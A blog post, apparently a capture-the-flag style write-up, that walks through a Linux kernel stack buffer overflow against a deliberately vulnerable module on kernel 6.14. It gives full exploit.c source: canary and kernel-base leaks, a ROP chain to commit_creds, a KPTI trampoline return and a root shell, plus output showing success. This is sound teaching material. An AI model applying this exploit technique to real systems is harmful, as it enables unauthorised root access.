---
layout: post
title:  "Linux Kernel Buffer Overflow"
date:   2025-09-18 06:50:19 +0200
author: cl1nical
hidden: true
---
### Description
This post features how to do a buffer overflow on the [Buffer Overflow Kernel Module](/2025/09/18/bof-kernel-module.html). The exploit will be demonstrated by exploiting the purposely vulnerable **read** and **write** functions that the kernel module exposes to user mode. The interesting thing about this exploit is that it will show where to jump in the KTPI trampoline on this kernel version: 6.14.0-27-generic.<br>
This blog post was inspired by [Midas' blog post](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) from 2021. 
The init script used to setup the challenge is from **hpx-2020 kernel-rop** but I have changed the kernel to be a modern version used by Ubuntu 24 LTS. The full exploit script will be present in the bottom of the post.
<br>
Click the link to download the zip archive containing the files: [kernel-rop.zip](/binaries/kernel-rop.zip)
### Goal
To elevate privileges from normal user to root user.<br>

### Steps taken
1. Save state in user mode
1. Open file descriptor to the kernel device
1. Leak kernel .text address and canary with the **read** function
1. Calculate offsets to the gadgets
1. Buffer overflow using the **write** function
1. ROP the following functions
    - find_task_by_vpid
    - prepare_kernel_creds
    - commit_creds
1. Return to userland
1. Spawn a shell



### Scripts
For decompressing the kernel BzImage. Note that you might have a different linux kernel header folder:
```
/usr/src/linux-headers-6.14.0-27-generic/scripts/extract-vmlinux bzImage > vmlinux 
```
For running the kernel:
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1" \
    -s
```
For decompressing the file system:
```
#!/bin/sh

mkdir initramfs
cd initramfs
cp ../initramfs.cpio.gz .
gunzip ./initramfs.cpio.gz
cpio -idm < ./initramfs.cpio
rm initramfs.cpio
```
For compiling exploit.c, putting it in the file system and compressing it. Notice that this script takes exploit.c as the
first argument:
```
#!/bin/sh
gcc -o exploit -static $1
mv ./exploit ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
```

### Overview of the main function:
```c
int main() {

  save_state();

  open_dev("hackme");

  leak();
  
  fix_offsets();

  overflow();

  close(global_fd);
  puts("[!] end of main");

  return 0;
  }
```

### 1: Saving state
When returning from kernel mode to user mode, one will need to have a record of what different registers were before entering kernel mode. These register values will be necessary when creating the ROP chain that will end up returning to user mdoe. The code snippet below shows how to save registers:
```c
uint64_t user_mode_cs, user_ss, user_rflags, user_sp, user_rbp;

void save_state(){
    __asm__ volatile(
        ".intel_syntax noprefix;"
        "mov ax, cs;"
        "mov user_mode_cs, ax;"
        "mov ax, ss;"
        "mov user_ss, ax;"
        "mov user_sp, rsp;"
        "mov user_rbp, rbp;"
        "pushfq;"
        "pop rax;"
        "mov user_rflags, rax;"
        ".att_syntax;"
        : "=m"(user_mode_cs), "=m"(user_ss), "=m"(user_sp), "=m"(user_rflags)
        :
        : "rax", "memory"
    );
    puts("[*] Saved state");
}
```
### 2: Opening the file descriptor
To interact with a kernel module, one has to open a handle to it. The function below takes the name of the target kernel module as a paramter:
```c
void open_dev(char *name){
  char devname[100] = "/dev/";
  strcat(devname, name);
  printf("Opening name: %s\n", devname);
  global_fd = open(devname, O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
    puts("[*] Opened device");
    printf("Global fd: %d\n", global_fd);
    }
}
```
### 3: Leaking canary and .text address using the read function
Since the **read** function allows out-of-bounds (OOB) read we can leak the canary and a .text address since the canary and saved return pointer reside on the stack right after the buffer: 
```c
void leak(void){
    uint32_t n = 200;
    char leak[n]; // Unsigned long is 8 bytes on 64-bit. Necessary to contain 8 byte canary
    memset(leak, 'A', sizeof(leak));
    printf("Size of leak: %lu\n", sizeof(leak));
    ssize_t success = read(global_fd, leak, sizeof(leak));
    memcpy(&canary, &leak[100], sizeof(canary));
    memcpy(&rbp_leak, &leak[108], sizeof(rbp_leak));
    uint64_t kleak = 0;
    memcpy(&kleak, &leak[116], sizeof(kleak));

    if (success == 0) {
        puts("[+] raw_copy_to_user succeeded");
    }

    printf("[*] Canary: 0x%lx\n", canary);

    kbase = kleak - 0x7BF24C;

    printf("[*] rbp_leak: 0x%lx\n", rbp_leak);
    printf("[*] Kleak:  0x%lx\n", kleak);
    printf("[*] Kbase: 0x%lx\n", kbase);
    printf("[*] User rsp: 0x%lx\n", user_sp);
}
```
The user mode buffer before the read call:
<img src="/assets/images/kernel/bof/user_buf_1.png" style="width:100%; height:100%;" />

And because the kernel buffer is 100 bytes it will be off by a little offset:
<img src="/assets/images/kernel/bof/user_buf_2.png" style="width:100%; height:100%;" />

So adjusting for the offset: 
<img src="/assets/images/kernel/bof/user_buf_3.png" style="width:100%; height:100%;" />
The canary can be seen at the address: 0x7ffd6e8574f4. On the right side of that is the saved RBP. The .text address that can be used for calculating kernel base is at the address: 0x7ffd6e857504

### 4. Calculating the offsets
Gadgets can be found with the tool ROPgadget using the command:
```
ROPgadget --all --binary vmlinux > gadget.txt
```
It is recommended to put into a file since it is faster when using grep instead of running ROPgadget every time. Since ROPgadget might not be able to tell if bytes are in executable memory or it can return 'fantasy gadgets' - gadgets that cannot be used. One thing I found was to grep for "81" since that would be a pretty good indicator that the gadget address was in executable mem. For example:
```
cat gadgets.txt | grep "81" | grep "pop rdi" | grep "ret"
```
And an example of an address containing "81" can be seen below:
```
0xffffffff81368000 : pop rdi ; ret
```

After finding all the necessary gadgets, their correct offsets were calculated using the **fix_offsets** function:
```c
// kbase of vmlinux (when not loaded or anything): 0xffffffff81000000
void fix_offsets() {
    pop_rdi = kbase + 0x368000;
    pop_rax = kbase + 0x2C11B4;
    pop_rcx = kbase + 0x86c37a;
    pop_rdx = kbase + 0x7EC1D6;
    pop_rax_pop_rdi = kbase + 0x5e0360;
    pop_r11_mov_cl_qword_rax = kbase + 0x406e0f;
    push_rax_call_rcx  = kbase + 0x72c38c;
    ret = kbase + 0x1B134F9;
    
    find_task_by_vpid = kbase + 0x3BB5C0;
    prepare_kernel_cred = kbase + 0x3C9A00;
    commit_creds = kbase + 0x3C9740;
    kpti_trampoline = kbase + 0x11bc;

    printf("pop rdi: 0x%lx\n", pop_rdi);
    printf("pop rax: 0x%lx\n", pop_rax);
    printf("pop rcx: 0x%lx\n", pop_rcx);
    printf("pop rax pop rdi: 0x%lx\n", pop_rax_pop_rdi);
    printf("pop r11 mov cl qword ptr rax: 0x%lx\n", pop_r11_mov_cl_qword_rax);
    printf("push rax call rcx: 0x%lx\n", push_rax_call_rcx);
    printf("ret: 0x%lx\n", ret);

    printf("find_task_by: 0x%lx\n", find_task_by_vpid);
    printf("prepk_creds: 0x%lx\n", prepare_kernel_cred);
    printf("commit_cred: 0x%lx\n", commit_creds);
    printf("kpti_trampo: 0x%lx\n", kpti_trampoline);

    puts("offsets fixed");
}
```

### 5. Buffer overflow using the write function
The **write** function uses a buffer that is larger than the target kernel buffer. This causes a buffer overflow that allows the attacker to take control of RIP. The code for the **overflow** function can be seen below:
```c
void overflow() {
  char buf[0x500];
  memset(buf, 'B', 250);
  uint64_t *chain = (uint64_t *)&buf[100];
  *chain++ = canary;
  *chain++ = 0; // rbp
  *chain++ = pop_rdi;
  *chain++ = 0x1; // init vpid
  *chain++ = find_task_by_vpid;
  *chain++ = pop_rcx; // transfer rax to rdi
  *chain++ = pop_rax_pop_rdi; // transfer rax to rdi
  *chain++ = push_rax_call_rcx; // transfer rax to rdi
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rcx; // transfer rax to rdi
  *chain++ = pop_rax_pop_rdi; // transfer rax to rdi
  *chain++ = push_rax_call_rcx; // transfer rax to rdi
  *chain++ = commit_creds;
  *chain++ = kpti_trampoline; // kpti_trampoline
  *chain++ = 0x3;
  *chain++ = 0x3;
  *chain++ = (uint64_t)&my_jump; // Necessary to 16 byte align stack before spawning shell
  *chain++ = user_mode_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss; // change to 4 to take the jmp

  write(global_fd, buf, 0x500); // since chain has been incremeneted
}
```

### Ropchain
Let's take a deeper look at the ropchain displayed above.<br>
The code below pops the value 1 into the rdi register and then returns to find_task_by_vpid. The reason is that the exploit need to get a task struct of a process that is running with root privileges. The init process always has process id 1 and runs as root. The reason the exploit is not just calling the classic commit_creds(prepare_kernel_creds(0)) is that this was mitigated back in 2022 so that calling prepare_kernel_creds(0) does not default to root: [see more here](https://lore.kernel.org/lkml/87bkpxh3sz.fsf@cjr.nz/T/)
```c
    *chain++ = pop_rdi;
    *chain++ = 0x1; // init vpid
    *chain++ = find_task_by_vpid;
```
When the above function call is done, the resulting ptr to a task struct will be in RAX as usual. So the next task is to get the value from RAX into RDI. This would prove to be a real challenge as a modern kernel like this one is not full of convenient ropgadgets. After looking for 3 days I finally found the proper way to go about this:
```c
  *chain++ = pop_rcx; // transfer rax to rdi
  *chain++ = pop_rax_pop_rdi; // transfer rax to rdi
  *chain++ = push_rax_call_rcx; // transfer rax to rdi
  *chain++ = prepare_kernel_cred;
```
The code snippet above pops a gadget into the RCX register, then pushes RAX and calls the gadget in RCX. So when RCX is called a return value will be pushed to the stack. This return value will be popped into RAX and then the value that was pushed from RAX will be popped into RDI. Then the gadget will return to the prepare_kernel_cred function with RDI now containing the ptr to the task struct.<br>
The same trick is used to call commit_creds with the result of prepare_kernel_cred and then the ropchain jumps to the KPTI trampoline.

The below code shows the final part of the ropchain. The 0x3 values were initially to try and pass a check that will be explained in the next section but ended up just being padding. The reason why **my_jump** is called when returning to user mode instead of directly to **get_shell** is to align the stack 16 bytes so that **system(/bin/sh)** does not segfault.
```c
  *chain++ = 0x3; // padding
  *chain++ = 0x3; // padding
  *chain++ = (uint64_t)&my_jump; // Necessary to 16 byte align stack before spawning shell
  *chain++ = user_mode_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;
```

The reason why the user_mode_cs register, stack pointer and etc. have to be in the ropchain is because it will end in an iretq instruction. The iretq instruction will pop from the stack and into registers in the following order:<br>
1. RIP
1. cs
1. rflags
1. sp (stack pointer) 
1. ss

### Returning to userland
Since KPTI was active, the return to user mode has to go through what is called "KPTI trampoline" which is the code the kernel normally uses to return to userland. Previously this has been done as in [this](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) and [this](https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html#KPTI%E3%81%AE%E6%89%B1%E3%81%84) blogpost (search for KPTI). But for this version of the Linux kernel (6.14.0-27-generic) things were looking a little different.<br>
Below you can see a picture of the return instruction in commit_creds. It also shows that the ropchain will return to common_interrupt_return+108 which starts by saving the current RSP in the RDI register:
<img src="/assets/images/kernel/bof/return_to_user_1.png" style="width:100%; height:100%;" />
And the below picture will give a better overview. The code will run until common_interrupt_return+140 where it will jump to common_interrupt_return+192:
<img src="/assets/images/kernel/bof/return_to_user_2.png" style="width:100%; height:100%;" />
As can be seen, a lot of values are being pushed in relation to the old RSP (now in RDI). So when at common_interrupt_return+140 the stack looks like:
<img src="/assets/images/kernel/bof/return_to_user_3.png" style="width:100%; height:100%;" />
In the above picture some of the values on the stack are from the ropchain, for example the value 246 at address 0xfffffe0000002fe8 is the user_rflags value. At address 0xfffffe0000002fd8 is the address of the **my_jump** function with the value of 401eec.
<br>

Continuing until common_interrupt_return+73 a test instruction will be executed. Right below it at common_interrupt_return+78 is a jne instruction. The exploit requires that this jump is taken and redirects the code to common_interrupt_return+241.<br>
Test actually performs a bitwise AND instruction and if the result is 0, they were 'equal'. So the exploit requires that this values is not equal. Luckily this is just what happens when the following is executed 0x33 AND 0x3 (0x33 is the user mode cs value from the ropchain):
<img src="/assets/images/kernel/bof/return_to_user_4.png" style="width:100%; height:100%;" />
Verifying that the jump is taken:
<img src="/assets/images/kernel/bof/return_to_user_5.png" style="width:100%; height:100%;" />
<br>

And now another test instruction will be executed at common_interrupt_return+241. This time the jump is not intended to be taken. Not taking the jump will lead to the iretq instruction. Here, the 0x2b values is the user_ss value from the ropchain:
<img src="/assets/images/kernel/bof/return_to_user_6.png" style="width:100%; height:100%;" />
And verifying that the jump is not taken:
<img src="/assets/images/kernel/bof/return_to_user_7.png" style="width:100%; height:100%;" />
<br>

The last instruction in kernel mode is the iretq instruction that was explained in the previous section about the ropchain. The picture below also shows the stack where the following values are:
1. RIP
1. cs
1. rflags
1. sp (stack pointer) 
1. ss

<img src="/assets/images/kernel/bof/return_to_user_8.png" style="width:100%; height:100%;" />

Finally, after stepping over the iretq instruction the exploit is back in user mode:
<img src="/assets/images/kernel/bof/return_to_user_9.png" style="width:100%; height:100%;" />

### Spawning a shell
As mentioned earlier, the stack needs to be aligned 16 bytes before spawning a shell. The **my_jump** function is used for that. The below code aligns the stack 16 bytes and spawns a shell if root privileges has been achieved:

```c
void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        while(1) {
            puts("Done");    
        }
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

uint64_t shell_addr = (uint64_t)&get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__ volatile(
        ".intel_syntax noprefix;"
        "mov rax, qword ptr [shell_addr];"
        "push rax;"
        "ret;"
        ".att_syntax;"
         : /* no outputs */
        : /* no inputs */
        : "rax"
    );
}
```

### Running the exploit in the terminal
```
/ $ id
uid=1000 gid=1000 groups=1000
/ $ cat /dev/sda
cat: can't open '/dev/sda': Permission denied
/ $ ./exploit 
[*] Saved state
[*] Opening name: /dev/hackme
[*] Opened device
[*] Global fd: 3
[*] Size of leak: 200
[*] raw_copy_to_user succeeded
[*] Canary: 0x7bfe3a46dd7b1800
[*] rbp_leak: 0xffffa0ab40203be8
[*] Kleak:  0xffffffffa65bf24c
[*] Kbase: 0xffffffffa5e00000
[*] User rsp: 0x7ffd8506d9c0
[*] pop rdi: 0xffffffffa6168000
[*] pop rax: 0xffffffffa60c11b4
[*] pop rcx: 0xffffffffa666c37a
[*] pop rax pop rdi: 0xffffffffa63e0360
[*] pop r11 mov cl qword ptr rax: 0xffffffffa6206e0f
[*] push rax call rcx: 0xffffffffa652c38c
[*] ret: 0xffffffffa79134f9
[*] find_task_by: 0xffffffffa61bb5c0
[*] prepk_creds: 0xffffffffa61c9a00
[*] commit_cred: 0xffffffffa61c9740
[*] kpti_trampo: 0xffffffffa5e011bc
[*] Offsets fixed
[*] Returned to userland
[*] UID: 0, got root!
/ # id
uid=0 gid=0
/ # cat /dev/sda
cl1nical.testflag{YOU_WIN!}
/ # 
```


### Checking for stability
After getting the exploit running it was time for making it stable. After enabling ASLR it was only working 1/4 of the times which is not a lot. I figured out that some of the ropgadgets would only be calculated correctly sometimes. For example pop rcx was unstable. For that reason I found a different pop rcx that would work every time. Finally, I used ChatGPT to generate a script that could automate testing the exploit to see how stable it was.<br>
I added the following line to run.sh, opening port 4444:
```
 -serial tcp:127.0.0.1:4444,server,nowait
```
So run.sh would become:
```
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1" \
    -s \
    -serial tcp:127.0.0.1:4444,server,nowait
```

Then I used the automate-exploit-test.py script. I will not post the script here since it is too long but it is part of the zip archive. Here are the results form test-results.txt:
```
Total attempts  : 200
Success counter : 200
Pct succes      : 100.0%
Elapsed time    : 3701.29s
```
So after running the exploit for 200 attempts, all of them succeeded. This was very positive!<br>
But since the exploit is reliant on the stack and not randomized SLAB memory it is not too surprising.

### Full exploit.c
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>

// Gadgets
uint64_t kbase;
uint64_t pop_rdi;
uint64_t pop_rax;
uint64_t pop_rcx;
uint64_t pop_rdx;
uint64_t pop_rax_pop_rdi;
uint64_t pop_r11_mov_cl_qword_rax;
uint64_t push_rax_call_rcx;
uint64_t ret;

// Kernel symbols
uint64_t find_task_by_vpid;
uint64_t prepare_kernel_cred;
uint64_t commit_creds;
uint64_t kpti_trampoline;

// Other variables
uint32_t global_fd;
uint64_t canary;
uint64_t rbp;
uint64_t rbp_leak = 0;
uint64_t page_base;

void print_leak(unsigned long *leak, unsigned n) {
    for (unsigned i = 0; i < n; ++i) {
        printf("%u: %lx\n", i, leak[i]);
    }
}

// kbase of vmlinux (when not loaded or anything): 0xffffffff81000000
void fix_offsets() {
    pop_rdi = kbase + 0x368000;
    pop_rax = kbase + 0x2C11B4;
    pop_rcx = kbase + 0x86c37a;
    pop_rdx = kbase + 0x7EC1D6;
    pop_rax_pop_rdi = kbase + 0x5e0360;
    pop_r11_mov_cl_qword_rax = kbase + 0x406e0f;
    push_rax_call_rcx  = kbase + 0x72c38c;
    ret = kbase + 0x1B134F9;
    
    find_task_by_vpid = kbase + 0x3BB5C0;
    prepare_kernel_cred = kbase + 0x3C9A00;
    commit_creds = kbase + 0x3C9740;
    kpti_trampoline = kbase + 0x11bc;

    printf("[*] pop rdi: 0x%lx\n", pop_rdi);
    printf("[*] pop rax: 0x%lx\n", pop_rax);
    printf("[*] pop rcx: 0x%lx\n", pop_rcx);
    printf("[*] pop rax pop rdi: 0x%lx\n", pop_rax_pop_rdi);
    printf("[*] pop r11 mov cl qword ptr rax: 0x%lx\n", pop_r11_mov_cl_qword_rax);
    printf("[*] push rax call rcx: 0x%lx\n", push_rax_call_rcx);
    printf("[*] ret: 0x%lx\n", ret);

    printf("[*] find_task_by: 0x%lx\n", find_task_by_vpid);
    printf("[*] prepk_creds: 0x%lx\n", prepare_kernel_cred);
    printf("[*] commit_cred: 0x%lx\n", commit_creds);
    printf("[*] kpti_trampo: 0x%lx\n", kpti_trampoline);

    puts("[*] Offsets fixed");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void open_dev(char *name){
  char devname[100] = "/dev/";
  strcat(devname, name);
  printf("[*] Opening name: %s\n", devname);
  global_fd = open(devname, O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
    puts("[*] Opened device");
    printf("[*] Global fd: %d\n", global_fd);
    }
}

uint64_t user_mode_cs, user_ss, user_rflags, user_sp, user_rbp;

void save_state(){
    __asm__ volatile(
        ".intel_syntax noprefix;"
        "mov ax, cs;"
        "mov user_mode_cs, ax;"
        "mov ax, ss;"
        "mov user_ss, ax;"
        "mov user_sp, rsp;"
        "mov user_rbp, rbp;"
        "pushfq;"
        "pop rax;"
        "mov user_rflags, rax;"
        ".att_syntax;"
        : "=m"(user_mode_cs), "=m"(user_ss), "=m"(user_sp), "=m"(user_rflags)
        :
        : "rax", "memory"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        while(1) {
            puts("Done");    
        }
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

uint64_t shell_addr = (uint64_t)&get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__ volatile(
        ".intel_syntax noprefix;"
        "mov rax, qword ptr [shell_addr];"
        "push rax;"
        "ret;"
        ".att_syntax;"
         : /* no outputs */
        : /* no inputs */
        : "rax"
    );
}

void leak(void){
    uint32_t n = 200;
    char leak[n]; // Unsigned long is 8 bytes on 64-bit. Necessary to contain 8 byte canary
    memset(leak, 'A', sizeof(leak));
    printf("[*] Size of leak: %lu\n", sizeof(leak));
    ssize_t success = read(global_fd, leak, sizeof(leak));
    memcpy(&canary, &leak[100], sizeof(canary));
    memcpy(&rbp_leak, &leak[108], sizeof(rbp_leak));
    uint64_t kleak = 0;
    memcpy(&kleak, &leak[116], sizeof(kleak));

    if (success == 0) {
        puts("[*] raw_copy_to_user succeeded");
    }

    printf("[*] Canary: 0x%lx\n", canary);

    kbase = kleak - 0x7BF24C;

    printf("[*] rbp_leak: 0x%lx\n", rbp_leak);
    printf("[*] Kleak:  0x%lx\n", kleak);
    printf("[*] Kbase: 0x%lx\n", kbase);
    printf("[*] User rsp: 0x%lx\n", user_sp);
}

uint64_t user_rip = (uint64_t )my_jump;

void printer_func(void) {
    puts("Hello userland");
}

void overflow() {
  char buf[0x500];
  memset(buf, 'B', 250);
  uint64_t *chain = (uint64_t *)&buf[100];
  *chain++ = canary;
  *chain++ = 0; // rbp
  *chain++ = pop_rdi;
  *chain++ = 0x1; // init vpid
  *chain++ = find_task_by_vpid;
  *chain++ = pop_rcx;
  *chain++ = pop_rax_pop_rdi;
  *chain++ = push_rax_call_rcx;
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rcx; // transfer rax to rdi
  *chain++ = pop_rax_pop_rdi; // transfer rax to rdi
  *chain++ = push_rax_call_rcx; // transfer rax to rdi
  *chain++ = commit_creds;
  *chain++ = kpti_trampoline; // kpti_trampoline
  *chain++ = 0x3; // padding
  *chain++ = 0x3; // padding
  *chain++ = (uint64_t)&my_jump; // Necessary to 16 byte align stack before spawning shell
  *chain++ = user_mode_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;

  write(global_fd, buf, 0x500); // since chain has been incremeneted
}

int main() {

  save_state();

  open_dev("hackme");

  leak();
  
  fix_offsets();

  overflow();

  close(global_fd);
  puts("[!] end of main");

  return 0;
  }
```


### Resources:
I used [this blog post](https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html#KPTI%E3%81%AE%E6%89%B1%E3%81%84) by **ptr-yudai** and [this blog post](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) by **Midas** for learning about kernel exploitation, thank you!

